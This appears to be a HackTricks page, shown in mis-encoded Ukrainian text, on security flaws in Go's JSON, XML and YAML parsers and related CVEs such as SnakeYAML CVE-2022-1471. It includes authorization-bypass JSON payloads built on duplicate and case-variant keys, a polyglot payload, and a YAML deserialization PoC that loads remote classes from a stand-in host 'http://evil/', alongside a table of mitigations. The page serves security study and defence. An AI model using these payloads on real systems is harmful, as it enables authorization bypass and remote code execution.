# JSON, XML & Yaml Hacking & –ü—Ä–æ–±–ª–µ–º–∏

{{#include ../banners/hacktricks-training.md}}

## –î–µ–∫–æ–¥–µ—Ä JSON —É Go

–ë—É–ª–æ –≤–∏—è–≤–ª–µ–Ω–æ –Ω–∞—Å—Ç—É–ø–Ω—ñ –ø—Ä–æ–±–ª–µ–º–∏ –≤ –ø–∞—Ä—Å–µ—Ä—ñ JSON —É Go, —Ö–æ—á–∞ –≤–æ–Ω–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø—Ä–∏—Å—É—Ç–Ω—ñ –π –≤ —ñ–Ω—à–∏—Ö –º–æ–≤–∞—Ö. –¶—ñ –ø—Ä–æ–±–ª–µ–º–∏ –±—É–ª–∏ –æ–ø—É–±–ª—ñ–∫–æ–≤–∞–Ω—ñ –≤ [**this blog post**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/).

–ü–∞—Ä—Å–µ—Ä–∏ JSON, XML —ñ YAML —É Go –º–∞—é—Ç—å –¥–æ–≤–≥—É –Ω–∏–∑–∫—É –Ω–µ–≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—Å—Ç–µ–π —ñ –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏—Ö –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, —è–∫—ñ –º–æ–∂–Ω–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –¥–ª—è **bypass authentication**, **escalate privileges**, –∞–±–æ **exfiltrate sensitive data**.


### (Un)Marshaling Unexpected Data

–ú–µ—Ç–∞ ‚Äî –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ structs, —è–∫—ñ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –Ω–∞–ø–∞–¥–Ω–∏–∫—É —á–∏—Ç–∞—Ç–∏/–∑–∞–ø–∏—Å—É–≤–∞—Ç–∏ —á—É—Ç–ª–∏–≤—ñ –ø–æ–ª—è (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `IsAdmin`, `Password`).

- –ü—Ä–∏–∫–ª–∞–¥ Struct:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- –ü–æ—à–∏—Ä–µ–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ

1. **–í—ñ–¥—Å—É—Ç–Ω—ñ–π tag** (–±–µ–∑ tag = field –≤—Å–µ —â–µ –æ–±—Ä–æ–±–ª—è—î—Ç—å—Å—è –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º):
```go
type User struct {
Username string
}
```
Payload:
```json
{"Username": "admin"}
```
2. **–ù–µ–∫–æ—Ä–µ–∫—Ç–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `-`**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // ‚ùå wrong
}
```
Payload:
```json
{"-": true}
```
‚úîÔ∏è –ü—Ä–∞–≤–∏–ª—å–Ω–∏–π —Å–ø–æ—Å—ñ–± –∑–∞–±–ª–æ–∫—É–≤–∞—Ç–∏ –ø–æ–ª–µ –≤—ñ–¥ (–¥–µ)–º–∞—Ä—à–∞–ª—ñ–Ω–≥—É:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### –í—ñ–¥–º—ñ–Ω–Ω–æ—Å—Ç—ñ –ø–∞—Ä—Å–µ—Ä—ñ–≤

–ú–µ—Ç–∞ ‚Äî –æ–±—Ö—ñ–¥ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó —à–ª—è—Ö–æ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ç–æ–≥–æ, —è–∫ —Ä—ñ–∑–Ω—ñ –ø–∞—Ä—Å–µ—Ä–∏ –ø–æ-—Ä—ñ–∑–Ω–æ–º—É —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—é—Ç—å –æ–¥–∏–Ω —ñ —Ç–æ–π –∂–µ payload, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:
- CVE-2017-12635: Apache CouchDB –æ–±—Ö—ñ–¥ —á–µ—Ä–µ–∑ –¥—É–±–ª—ñ–∫–æ–≤–∞–Ω—ñ –∫–ª—é—á—ñ
- 2022: Zoom 0-click RCE —á–µ—Ä–µ–∑ —Ä–æ–∑–±—ñ–∂–Ω–æ—Å—Ç—ñ –≤ XML-–ø–∞—Ä—Å–µ—Ä–∞—Ö
- GitLab 2025 SAML –æ–±—Ö—ñ–¥ —á–µ—Ä–µ–∑ –æ—Å–æ–±–ª–∏–≤–æ—Å—Ç—ñ XML

**1. –î—É–±–ª—ñ–∫–æ–≤–∞–Ω—ñ –ø–æ–ª—è:**
Go's `encoding/json` –±–µ—Ä–µ **–æ—Å—Ç–∞–Ω–Ω—î** –ø–æ–ª–µ.
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
–Ü–Ω—à—ñ –ø–∞—Ä—Å–µ—Ä–∏ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, Java‚Äôs Jackson) –º–æ–∂—É—Ç—å –≤–∑—è—Ç–∏ **–ø–µ—Ä—à–∏–π**.

**2. –ù–µ—á—É—Ç–ª–∏–≤—ñ—Å—Ç—å –¥–æ —Ä–µ–≥—ñ—Å—Ç—Ä—É:**
Go –Ω–µ—á—É—Ç–ª–∏–≤–∏–π –¥–æ —Ä–µ–≥—ñ—Å—Ç—Ä—É:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
–ù–∞–≤—ñ—Ç—å —Ç—Ä—é–∫–∏ –∑ Unicode –ø—Ä–∞—Ü—é—é—Ç—å:
```go
json.Unmarshal([]byte(`{"a‚Ñ™tion≈ø": "bypass"}`), &req)
```
**3. Cross-service mismatch:**
–£—è–≤—ñ–º–æ:
- Proxy, –Ω–∞–ø–∏—Å–∞–Ω–∏–π –Ω–∞ Go
- AuthZ service, –Ω–∞–ø–∏—Å–∞–Ω–∏–π –Ω–∞ Python

Attacker sends:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python –±–∞—á–∏—Ç—å `UserAction`, –¥–æ–∑–≤–æ–ª—è—î –π–æ–≥–æ
- Go –±–∞—á–∏—Ç—å `AdminAction`, –≤–∏–∫–æ–Ω—É—î –π–æ–≥–æ


### Data Format Confusion (Polyglots)

–ú–µ—Ç–∞ ‚Äî –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏ —Å–∏—Å—Ç–µ–º–∏, —è–∫—ñ –∑–º—ñ—à—É—é—Ç—å —Ñ–æ—Ä–º–∞—Ç–∏ (JSON/XML/YAML) –∞–±–æ –Ω–µ –±–ª–æ–∫—É—é—Ç—å –¥–æ—Å—Ç—É–ø –ø—Ä–∏ –ø–æ–º–∏–ª–∫–∞—Ö –ø–∞—Ä—Å–µ—Ä–∞, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:
- **CVE-2020-16250**: HashiCorp Vault parsed JSON with an XML parser after STS returned JSON instead of XML.

–ê—Ç–∞–∫—É—é—á–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—é—î:
- –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Accept: application/json`
- –ß–∞—Å—Ç–∫–æ–≤–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å —Ç—ñ–ª–∞ JSON

XML-–ø–∞—Ä—Å–µ—Ä Go —Ä–æ–∑–ø–∞—Ä—Å–∏–≤ –π–æ–≥–æ **–≤—Å–µ –æ–¥–Ω–æ** —ñ –¥–æ–≤—ñ—Ä–∏–≤—Å—è —ñ–Ω'—î–∫–æ–≤–∞–Ω—ñ–π —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ.

- Crafted payload:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
–†–µ–∑—É–ª—å—Ç–∞—Ç:
- **Go JSON** parser: `Action_2` (case-insensitive + last wins)
- **YAML** parser: `Action_1` (case-sensitive)
- **XML** parser: parses `"Action_3"` inside the string

---

## –ü–æ–º—ñ—Ç–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –ø–∞—Ä—Å–µ—Ä—ñ–≤ (2023-2025)

> –ù–∞–≤–µ–¥–µ–Ω—ñ –¥–∞–ª—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –∑ –ø—É–±–ª—ñ—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–∏–º–∏ –µ–∫—Å–ø–ª–æ–π—Ç–∞–º–∏ –ø–æ–∫–∞–∑—É—é—Ç—å, —â–æ –Ω–µ–±–µ–∑–ø–µ—á–Ω–∏–π –ø–∞—Ä—Å–∏–Ω–≥ ‚Äî —Ü–µ –±–∞–≥–∞—Ç–æ–º–æ–≤–Ω–∞ –ø—Ä–æ–±–ª–µ–º–∞, –∞ –Ω–µ –ª–∏—à–µ –ø—Ä–æ–±–ª–µ–º–∞ Go.

### SnakeYAML Deserialization RCE (CVE-2022-1471)

* –í—Ä–∞–∂–∞—î: `org.yaml:snakeyaml` < **2.0** (–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ Spring-Boot, Jenkins —Ç–æ—â–æ).
* –û—Å–Ω–æ–≤–Ω–∞ –ø—Ä–∏—á–∏–Ω–∞: `new Constructor()` –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑—É—î **–¥–æ–≤—ñ–ª—å–Ω—ñ Java-–∫–ª–∞—Å–∏**, —â–æ –¥–æ–∑–≤–æ–ª—è—î gadget chains, —è–∫—ñ –ø—Ä–∏–∑–≤–æ–¥—è—Ç—å –¥–æ remote-code execution.
* –û–¥–Ω–æ—Ä—è–¥–∫–æ–≤–∏–π PoC (–≤—ñ–¥–∫—Ä–∏—î –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä –Ω–∞ –≤—Ä–∞–∑–ª–∏–≤–æ–º—É —Ö–æ—Å—Ç—ñ):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* –í–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è / –ú—ñ—Ç—ñ–≥–∞—Ü—ñ—è:
1. **Upgrade to ‚â•2.0** (uses `SafeLoader` by default).
2. –£ —Å—Ç–∞—Ä—ñ—à–∏—Ö –≤–µ—Ä—Å—ñ—è—Ö —è–≤–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `new Yaml(new SafeConstructor())`.

### libyaml Double-Free (CVE-2024-35325)

* –°—Ç–æ—Å—É—î—Ç—å—Å—è: `libyaml` ‚â§0.2.5 (C-–±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞, —è–∫—É –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —á–∏—Å–ª–µ–Ω–Ω—ñ –ø—Ä–∏–≤'—è–∑–∫–∏ –¥–ª—è –º–æ–≤).
* –ü—Ä–æ–±–ª–µ–º–∞: –≤–∏–∫–ª–∏–∫ `yaml_event_delete()` –¥–≤—ñ—á—ñ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ double-free, —è–∫–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –ø–µ—Ä–µ—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–∞ DoS –∞–±–æ, –≤ –¥–µ—è–∫–∏—Ö —Å—Ü–µ–Ω–∞—Ä—ñ—è—Ö, heap exploitation.
* –°—Ç–∞—Ç—É—Å: Upstream –≤—ñ–¥—Ö–∏–ª–∏–≤ —è–∫ ‚ÄúAPI misuse‚Äù, –∞–ª–µ –¥–∏—Å—Ç—Ä–∏–±—É—Ç–∏–≤–∏ Linux –≤–∏–ø—É—Å—Ç–∏–ª–∏ –ø–∞—Ç—á–æ–≤–∞–Ω—É –≤–µ—Ä—Å—ñ—é **0.2.6**, —è–∫–∞ –æ–±–Ω—É–ª—è—î –≤–∫–∞–∑—ñ–≤–Ω–∏–∫ –ø—ñ—Å–ª—è –∑–≤—ñ–ª—å–Ω–µ–Ω–Ω—è –ø–∞–º'—è—Ç—ñ.

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* –°—Ç–æ—Å—É—î—Ç—å—Å—è: Tencent **RapidJSON** –¥–æ –∫–æ–º—ñ—Ç—É `8269bc2` (<1.1.0-patch-22).
* –ë–∞–≥: —É `GenericReader::ParseNumber()` –Ω–µ–Ω–∞–ª–µ–∂–Ω—ñ –∞—Ä–∏—Ñ–º–µ—Ç–∏—á–Ω—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º —Å—Ñ–æ—Ä–º—É–≤–∞—Ç–∏ –≤–µ–ª–∏—á–µ–∑–Ω—ñ —á–∏—Å–ª–æ–≤—ñ –ª—ñ—Ç–µ—Ä–∞–ª–∏, —è–∫—ñ –æ–±–µ—Ä—Ç–∞—é—Ç—å—Å—è –π –ø–æ—à–∫–æ–¥–∂—É—é—Ç—å heap ‚Äî –≤—Ä–µ—à—Ç—ñ-—Ä–µ—à—Ç —Ü–µ –¥–æ–∑–≤–æ–ª—è—î –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, –∫–æ–ª–∏ –æ—Ç—Ä–∏–º–∞–Ω–∏–π –≥—Ä–∞—Ñ –æ–±'—î–∫—Ç—ñ–≤ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —Ä—ñ—à–µ–Ω—å —â–æ–¥–æ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó.

---

### üîê Mitigations (Updated)

| –†–∏–∑–∏–∫                               | –í–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è / –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—è                                |
|-------------------------------------|------------------------------------------------------------|
| –ù–µ–≤—ñ–¥–æ–º—ñ –ø–æ–ª—è (JSON)                | `decoder.DisallowUnknownFields()`                          |
| –î—É–±–ª—ñ–∫–∞—Ç–∏ –ø–æ–ª—ñ–≤ (JSON)              | ‚ùå –í stdlib –Ω–µ–º–∞—î –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è ‚Äî –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) |
| –ù–µ—á—É—Ç–ª–∏–≤–µ –¥–æ —Ä–µ–≥—ñ—Å—Ç—Ä—É –∑—ñ—Å—Ç–∞–≤–ª–µ–Ω–Ω—è (Go) | ‚ùå –í–∏–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–µ–º–∞—î ‚Äî –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ struct tags + –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ –∫–∞–Ω–æ–Ω—ñ–∑—É–π—Ç–µ –≤—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ |
| XML —Å–º—ñ—Ç—Ç—î–≤—ñ –¥–∞–Ω—ñ / XXE             | –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –∑–∞—Ö–∏—â–µ–Ω–∏–π –ø–∞—Ä—Å–µ—Ä (`encoding/xml` + `DisallowDTD`)     |
| –ù–µ–≤—ñ–¥–æ–º—ñ –∫–ª—é—á—ñ YAML                  | `yaml.KnownFields(true)`                                   |
| **Unsafe YAML deserialization**     | –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ SafeConstructor / –æ–Ω–æ–≤—ñ—Ç—å –¥–æ SnakeYAML ‚â•2.0            |
| libyaml ‚â§0.2.5 double-free          | –û–Ω–æ–≤—ñ—Ç—å –¥–æ **0.2.6** –∞–±–æ –≤–∏–ø—É—Å–∫—É, –ø—Ä–æ–ø–∞—Ç—á–µ–Ω–æ–≥–æ –¥–∏—Å—Ç—Ä–∏–±—É—Ç–∏–≤–æ–º            |
| RapidJSON <patched commit           | –°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ –∑ –æ—Å—Ç–∞–Ω–Ω—å–æ—é –≤–µ—Ä—Å—ñ—î—é RapidJSON (‚â•–ª–∏–ø–µ–Ω—å 2024)              |

## –î–∏–≤. —Ç–∞–∫–æ–∂

{{#ref}}
mass-assignment-cwe-915.md
{{#endref}}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

- Baeldung ‚Äì ‚ÄúResolving CVE-2022-1471 With SnakeYAML 2.0‚Äù
- Ubuntu Security Tracker ‚Äì CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
